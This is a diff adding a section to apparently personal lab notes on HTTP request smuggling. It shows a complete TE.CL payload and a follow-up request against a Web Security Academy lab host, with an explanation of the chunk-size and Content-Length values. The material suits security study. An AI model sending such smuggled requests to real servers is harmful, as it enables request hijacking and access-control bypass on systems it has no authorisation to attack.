@@ -188,3 +188,50 @@ Notes
 - This technique relies on how the front-end and back-end disagree about framing; behavior may vary between servers.
 
 ![alt text](image-1.png)
+
+## TE.CL append data using POST
+
+First, detect the vulnerable website using the TE.CL detection technique above. Once confirmed, craft a chunked request that appends data (a POST) to the back-end by taking advantage of the framing mismatch.
+
+Example payload to send first:
+
+```http
+POST / HTTP/1.1\r\n
+Host: 0a6700d104e27314805ea8bc00d000b3.web-security-academy.net\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 4\r\n
+Transfer-Encoding: chunked\r\n
+\r\n
+9e\r\n
+POST /404 HTTP/1.1\r\n
+Host: 0a6700d104e27314805ea8bc00d000b3.web-security-academy.net\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 10\r\n
+\r\n
+x=\r\n
+0\r\n
+\r\n
+```
+
+Then immediately send the normal request (to be appended):
+
+```http
+POST / HTTP/1.1\r\n
+Host: 0a6700d104e27314805ea8bc00d000b3.web-security-academy.net\r\n
+Content-Type: application/x-www-form-urlencoded\r\n
+Content-Length: 0\r\n
+\r\n
+```
+
+Explanation
+
+- The outer `Content-Length: 4` tells a back-end that honors Content-Length to read 4 bytes of the body (those 4 bytes are the ASCII characters `9e\r\n`).
+- The chunked data then supplies the smuggled request (`POST /404 ...`) using a chunk-size of `9e` followed by the smuggled bytes.
+- The inner `Content-Length: 10` specifies the length of the smuggled request's body (in this example the body is `x=\r\n0\r\n\r\n`, the exact count depends on your payload).
+- The trailing `0\r\n\r\n` terminates the chunked stream so the front-end forwards everything to the back-end.
+
+Notes
+
+- Precise byte counts and CRLF placement are critical — off-by-one errors will break the smuggle.
+- The example uses `9e` as the chunk size and `10` for the inner content length because those values correspond to the example bytes shown; recompute them if you change the smuggled content.
+- Behavior varies by server implementations; always verify on the target.
